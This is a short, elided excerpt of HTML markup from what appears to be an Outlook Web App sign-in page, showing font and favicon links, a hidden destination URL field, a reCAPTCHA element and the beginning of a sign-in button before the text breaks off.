...
<link rel="shortcut icon" href="/owa/auth/15.0.1367/themes/resources/favicon.ico" type="image/x-icon">
...
@font-face {
    ...
    src: url("/owa/auth/15.0.1367/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
            url("/owa/auth/15.0.1367/themes/resources/segoeui-regular.ttf") format("truetype");
}

@font-face {
    font-family: "Segoe UI WPC Semilight";
    src: url("/owa/auth/15.0.1367/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
        url("/owa/auth/15.0.1367/themes/resources/segoeui-semilight.ttf") format("truetype");
}

@font-face {
    font-family: "Segoe UI WPC Semibold";
    src: url("/owa/auth/15.0.1367/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
        url("/owa/auth/15.0.1367/themes/resources/segoeui-semibold.ttf") format("truetype");
}
</style>
...
<input type="hidden" name="destination" value="https://autodiscover.astrogaming.com/owa/">
...
<div class="g-recaptcha" data-sitekey="6LcyYXwUAAAAAJPVc_30yYMmhZNHUo9wer6h35Ct"></div>
</td>
</tr>
		...
		<div class="signInEnter">
            <div onclick="return myClkLgn()" class="signinbutton" role="button" tabIndex="0" >
                <img class="imgLnk" 
